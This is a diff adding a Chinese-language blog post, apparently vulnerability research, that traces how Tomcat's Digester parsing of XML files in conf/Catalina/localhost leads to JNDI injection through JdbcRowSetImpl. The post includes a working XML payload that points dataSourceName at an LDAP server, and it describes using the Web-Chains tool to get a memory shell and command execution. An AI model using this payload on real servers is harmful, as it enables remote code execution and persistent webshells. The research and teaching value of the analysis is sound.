@@ -110,19 +110,22 @@
     <div class="toc-toggle">
       <i id="toc-b-icon" class="iconfont icon-liebiao-01" onclick="toggleShow()"></i>
     </div>
-    
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JdbcRowSetImpl"><span class="toc-number">2.</span> <span class="toc-text">JdbcRowSetImpl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tomcat-xml%E8%A7%A3%E6%9E%90%E6%B5%81%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">Tomcat xml解析流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#digester-parse"><span class="toc-number">4.</span> <span class="toc-text">digester.parse</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">5.1.</span> <span class="toc-text">内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">5.2.</span> <span class="toc-text">命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
   </div>
   
   <script>
     var show = false
     function toggleShow() {
       if (show) {
+        document.getElementsByClassName('toc')[0].className = 'toc'
         document.getElementById('toc-b-icon').className = 'iconfont icon-liebiao-01'
       } else {
+        document.getElementsByClassName('toc')[0].className = 'toc show'
         document.getElementById('toc-b-icon').className = 'iconfont icon-quxiao-01'
       }
       show = !show
     }
+    document.getElementsByClassName('toc')[0].onclick = toggleShow
   </script>
   
   <div class="article-header">
@@ -140,7 +143,258 @@
   </div>
   <div class="article">
   
-  <p><img src="/../images/TomcatXMLJNDI/1736497705437-ee70e445-ada1-4b3a-a392-77c665a436c7.png"></p>
+  <h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul>
+<li>Tomcat源码下载</li>
+<li><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.95/src/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.95/src/</a></li>
+<li><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.95/bin/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.95/bin/</a></li>
+<li>下载Tomcat源码与二进制文件，IDEA创建一个maven项目</li>
+<li>1、将源码中的<code>conf</code>、<code>webapps</code> 复制到创建的maven项目根路径</li>
+<li>2、将源码中的<code>java</code>、<code>modules</code> 直接复制到 <code>/Users/XXX/Code/Java/Tomcat8Debug/src/main</code> 中</li>
+<li>3、将二进制文件中的lib复制到根路径并添加为库文件</li>
+<li>4、将<code>maven</code>获取下列依赖</li>
+</ul>
+<pre><code class="language-xml">&lt;dependencies&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.easymock&lt;/groupId&gt;
+        &lt;artifactId&gt;easymock&lt;/artifactId&gt;
+        &lt;version&gt;3.4&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;ant&lt;/groupId&gt;
+        &lt;artifactId&gt;ant&lt;/artifactId&gt;
+        &lt;version&gt;1.7.0&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;wsdl4j&lt;/groupId&gt;
+        &lt;artifactId&gt;wsdl4j&lt;/artifactId&gt;
+        &lt;version&gt;1.6.2&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;javax.xml&lt;/groupId&gt;
+        &lt;artifactId&gt;jaxrpc&lt;/artifactId&gt;
+        &lt;version&gt;1.1&lt;/version&gt;
+    &lt;/dependency&gt;
+    &lt;dependency&gt;
+        &lt;groupId&gt;org.eclipse.jdt.core.compiler&lt;/groupId&gt;
+        &lt;artifactId&gt;ecj&lt;/artifactId&gt;
+        &lt;version&gt;4.6.1&lt;/version&gt;
+    &lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<ul>
+<li>5、删除<code>/Users/XXXX/Code/Java/Tomcat8Debug/src/main/modules/jdbc-pool/src/test</code>目录</li>
+<li>6、注释掉<code>src/main/java/org/apache/jasper/compiler/JDTCompiler.java</code></li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736497705437-ee70e445-ada1-4b3a-a392-77c665a436c7.png"></p>
+<ul>
+<li>7、运行配置</li>
+</ul>
+<pre><code class="language-bash">-Dcatalina.home=&quot;/Users/l1kec0de/Code/Java/Tomcat8Debug&quot;
+</code></pre>
+<p><img src="/../images/TomcatXMLJNDI/1736498204545-a89478e6-8bb1-4c3c-bb6e-743c7c38ee2e.png"></p>
+<h2 id="JdbcRowSetImpl"><a href="#JdbcRowSetImpl" class="headerlink" title="JdbcRowSetImpl"></a>JdbcRowSetImpl</h2><ul>
+<li>这就是低版本<code>fastjson</code>自动调用<code>geter/seter</code>打<code>jndi</code>注入的方法</li>
+<li><code>/Library/Java/JavaVirtualMachines/jdk-1.8.jdk/Contents/Home/jre/lib/rt.jar!/com/sun/rowset/JdbcRowSetImpl.class</code></li>
+<li>该类的<code>setDataSourceName</code>、<code>setAutoCommit</code>参数可控，那么可以触发<code>JNDI</code>注入</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736825341140-9fdb0994-68f5-476f-90b0-e15cf525e21c.png"></p>
+<ul>
+<li><code>com/sun/rowset/JdbcRowSetImpl.class#setDataSourceName</code>这里很明显就是设置变量值</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736825441168-a8fbc0d8-8f2a-46c9-855e-3b732d925435.png"></p>
+<ul>
+<li><code>com/sun/rowset/JdbcRowSetImpl.class#setAutoCommit</code>这里的<code>this.conn</code>我们再构造方法初始化时并没有赋值，因此为<code>null</code>进入<code>this.connect()</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736825574462-1c7b77fa-43b2-4607-bc1f-3ef9e3a620c9.png"></p>
+<ul>
+<li><code>com/sun/rowset/JdbcRowSetImpl.class#connect</code>这里进行了<code>jndi</code>查询，<code>getDataSourceName</code>参数值我们在最初的<code>setDataSourceName</code>方法可控，因此造成<code>jndi</code>注入。</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736825791648-60e6114b-297e-4994-b430-d540100ea2f1.png"></p>
+<h2 id="Tomcat-xml解析流程"><a href="#Tomcat-xml解析流程" class="headerlink" title="Tomcat xml解析流程"></a>Tomcat xml解析流程</h2><ul>
+<li>阅读前辈们的文章，我们得知Tomcat的后台进程<code>org/apache/catalina/core/ContainerBase.java</code>，每隔<code>10</code>秒就会调用<code>processChildren</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736835794856-981d2cc4-9c4f-442c-aa4d-647c0ce93eb3.png"></p>
+<ul>
+<li>然后接则调用每个容器的<code>backgroundProcess</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736835996478-4cf367ba-b5a2-4dd8-97f9-90307d6e733a.png"></p>
+<ul>
+<li>由于<code>org.apache.catalina.core.StandardHost</code> 继承与<code>org.apache.catalina.core.ContainerBase</code>，当这里的容器为<code>StandardHost</code>时跟进其父类的<code>backgroundProcess</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736837077936-2fb944af-e552-463e-9bfa-51f99c73c6bb.png"></p>
+<ul>
+<li>进入<code>fireLifecycleEvent</code>方法，注意第一个传递的参数<code>PERIODIC_EVENT=periodic</code>，循环调用监听器的<code>lifecycleEvent</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736837143396-63afc925-53ba-4e39-9b13-38a89e21fdec.png"></p>
+<ul>
+<li>这里根据不同的事件类型调用不同的方法，这里进入<code>check</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736837413354-e53756c2-ee90-473d-af98-2e9ccfdf42fe.png"></p>
+<ul>
+<li>这里循环检查部署在<code>webapps</code>的应用资源，接着进入<code>deployApps</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736837558180-f1f3555b-4b6b-4708-921f-c126812f3d66.png"></p>
+<ul>
+<li>这里的部署应用可以使用这三种方式</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736837769631-151f0bc4-55d1-4272-8e7c-890130e215e8.png"></p>
+<ul>
+<li>这里暂时跟进第一个<code>deployDescriptors</code>也就是xml配置的方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736838479137-074c1dab-77e2-4596-a08b-424cfbff27e6.png"></p>
+<ul>
+<li>这里读取<code>Tomcat</code>的<code>/Users/l1kec0de/Code/Java/Tomcat8Debug/conf/Catalina/localhost</code>目录下的xml文件，接着通过<code>es</code>线程池来进行统一调用。</li>
+<li>这里的<code>DeployDescriptor</code>调用<code>run</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736838760447-7b188cba-0f43-4671-b0c5-74dbc1c51a91.png"></p>
+<ul>
+<li>这里跟进去<code>deployDescriptor</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839120542-cd50bef1-76a7-489e-b56f-cac1e5ca8596.png"></p>
+<ul>
+<li>继续跟进<code>super.addChild</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839176308-591fdb48-c180-44d0-8f85-acfcca563f23.png"></p>
+<ul>
+<li>继续跟进<code>addChildInternal</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839213403-3d89cef7-b03a-448a-9860-7c4edc3f2a52.png"></p>
+<ul>
+<li>跟进<code>child.start</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839271441-e2a495d6-a154-40c1-b8dd-99eac8811d7a.png"></p>
+<ul>
+<li>这里进行初始化进入<code>init</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839705848-8e87c499-c7d0-4e23-bb51-579625a72955.png"></p>
+<ul>
+<li>初始化后进入<code>setStateInternal</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839744854-2d2f7b34-6a4b-4266-8ba8-8869f26b9acc.png"></p>
+<ul>
+<li>进入<code>fireLifecycleEvent</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839794124-1b4308b8-a645-4e02-86bf-b03af5a8d066.png"></p>
+<ul>
+<li>接着进入<code>lifecycleEvent</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839870731-03baad01-fbdc-4e1a-8959-34899388d0bd.png"></p>
+<ul>
+<li>接着进入<code>init</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839922998-22a27919-7c5b-44f3-99b8-1c01d995a53d.png"></p>
+<ul>
+<li>接着进入<code>contextConfig</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736839958234-d4e74e24-c47b-42c6-a721-ba6b14345573.png"></p>
+<ul>
+<li>接着进入<code>processContextConfig</code>进程上下文配置</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736840174324-65ab2427-2de5-4570-bad3-fa0be65720a9.png"></p>
+<ul>
+<li>读取<code>Users/l1kec0de/Code/Java/Tomcat8Debug/conf/Catalina/localhost/poc.xml</code>文件转为数据流，最终在<code>digester.parse(source)</code>触发jndi漏洞，</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736840245931-6a50bf51-6a73-4f18-a260-16770149c271.png"></p>
+<h2 id="digester-parse"><a href="#digester-parse" class="headerlink" title="digester.parse"></a>digester.parse</h2><ul>
+<li>为什么这个可以触发<code>jndi</code>漏洞呢？最开始发现这个不是<code>xml</code>只有<code>XXE</code>漏洞吗？</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736840442698-73fab0fe-460d-4f39-a974-4f9d7dbde6f5.png"></p>
+<ul>
+<li>跟进<code>com/sun/org/apache/xerces/internal/jaxp/SAXParserImpl.java#parse</code></li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736840479187-33b9f02a-c235-4cdd-b741-b37bd85f14d7.png"></p>
+<ul>
+<li>跟进<code>com/sun/org/apache/xerces/internal/parsers/AbstractSAXParser.java#parse</code></li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736840519752-5a94b7fc-24c1-48dc-8a52-80cd9c760ffd.png"></p>
+<ul>
+<li>跟进<code>com/sun/org/apache/xerces/internal/parsers/XMLParser.java#parse</code></li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736840624408-c70d93bd-c070-48db-a532-6f29663cec48.png"></p>
+<ul>
+<li>继续跟进<code>fConfiguration.parse</code></li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736840674430-177cc7c8-b469-4a6d-95f5-8609fd784f35.png"></p>
+<ul>
+<li>继续跟进<code>com/sun/org/apache/xerces/internal/parsers/XML11Configuration.java#parse</code></li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736840924554-cbcd8cab-99fd-4f59-85cf-9c87c793af74.png"></p>
+<ul>
+<li>到<code>fCurrentScanner.scanDocument</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736841104919-7b8d61e6-9f7d-4101-b0ac-d0241b55207b.png"></p>
+<ul>
+<li>这里当<code>event=4</code>跟进<code>next</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736841224616-4b3b21ef-7ba9-463a-930d-d8d9a88a8262.png"></p>
+<ul>
+<li>继续跟进<code>com/sun/org/apache/xerces/internal/impl/XMLDocumentFragmentScannerImpl.java#next</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736841301218-284a921c-40c3-4aa4-a6f1-ba9902e067ff.png"></p>
+<ul>
+<li>跟进<code>scanStartElement</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736842716138-add4a520-ec4d-4c9c-b909-b6e1d466463b.png"></p>
+<ul>
+<li>跟进<code>fDocumentHandler.startElement</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736842809275-4222d7a1-1d4a-466c-ac35-7a98b0ec82b7.png"></p>
+<ul>
+<li>接着跟进<code>fContentHandler.startElement</code>来到<code>/tomcat-util-scan.jar!/org/apache/tomcat/util/digester/Digester.class</code></li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736843134351-e6ecd684-b941-43d2-a9b1-5aa4742c9149.png"></p>
+<ul>
+<li>接着跟进<code>tomcat-util-scan.jar!/org/apache/tomcat/util/digester/SetPropertiesRule.class#begin</code>方法这里循环遍历需要赋值的属性</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736843815713-4cb659d1-f249-4f98-bd75-a0acc9b8e533.png"></p>
+<ul>
+<li>进入<code>IntrospectionUtils.setProperty</code>方法</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736843892501-87247a97-5801-4784-a6cb-ac4c5cc107c7.png"></p>
+<ul>
+<li>这里通过反射调用属性的set方法进行赋值，而在最初的时候我们就了解了<code>JdbcRowSetImpl</code>触发jndi的前提，因此造成了<code>jndi</code>注入漏洞</li>
+</ul>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul>
+<li>xml</li>
+</ul>
+<pre><code class="language-xml">&lt;Context&gt;
+  &lt;Manager className=&quot;com.sun.rowset.JdbcRowSetImpl&quot;
+    dataSourceName=&quot;ldap://127.0.0.1:50389/8a6753&quot;
+    autoCommit=&quot;true&quot;&gt;&lt;/Manager&gt;
+&lt;/Context&gt;
+</code></pre>
+<ul>
+<li>启动<code>Web-Chains</code>打开<code>JNDI</code>注入漏洞端口监听</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736844523481-44b3a592-48f3-4b01-872e-9924d315f25a.png"></p>
+<ul>
+<li>选择<code>DNSLogAndHHttp</code>并填入<code>DNS</code>地址可以判断存在哪些利用</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736844772249-e5be2c06-a502-4b27-84da-8820ee12d7ae.png"></p>
+<ul>
+<li>选择一个线程，每次延时<code>3</code>秒</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736844890420-8b6b9de7-627b-4466-876f-f7022a4e9f7c.png"></p>
+<ul>
+<li>发现可以通过CB反序列化来打jndi</li>
+</ul>
+<p><img src="/../images/TomcatXMLJNDI/1736845089162-901c6758-5fd7-4c76-a7e6-1431b45e7dc7.png"></p>
+<h3 id="内存马"><a href="#内存马" class="headerlink" title="内存马"></a>内存马</h3><p><img src="/../images/TomcatXMLJNDI/1736845363990-0d27b62e-bff7-4cdf-b94b-12b28268edbc.png"></p>
+<p><img src="/../images/TomcatXMLJNDI/1736845464158-6f80f330-1809-49ea-8b4f-f882888a6629.png"></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p><img src="/../images/TomcatXMLJNDI/1736845260151-ce3c981c-c324-4deb-a3dd-fd2f45e9bef4.png"></p>
+<p><img src="/../images/TomcatXMLJNDI/1736845235828-02af37b2-ac02-4304-9af3-bf135fc20d3f.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
+<li>1、Tomcat有个后台进行<code>org.apache.catalina.core.ContainerBackgroundProcessor</code>每<code>10</code>秒进行检测</li>
+</ul>
+<p><code>conf/Catalina/localhost</code>目录新创建的文件</p>
+<ul>
+<li>2、<code>org.apache.tomcat.util.digester.Digester#parse</code>可以解析<code>xml</code>文件初始化属性（通过反射调用其属性set方法）</li>
+</ul>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LittleHann/p/17735106.html">https://www.cnblogs.com/LittleHann/p/17735106.html</a></li>
+<li><a target="_blank" rel="noopener" href="https://y4tacker.github.io/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/">https://y4tacker.github.io/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/</a></li>
+<li><a target="_blank" rel="noopener" href="http://www.lvyyevd.cn/archives/tomcat%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce%E5%A7%BF%E5%8A%BF">http://www.lvyyevd.cn/archives/tomcat%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0rce%E5%A7%BF%E5%8A%BF</a></li>
+</ul>
 
 </div>
   <o3o key="mizore" api="https://o3o.mizore.site:2333"></o3o>
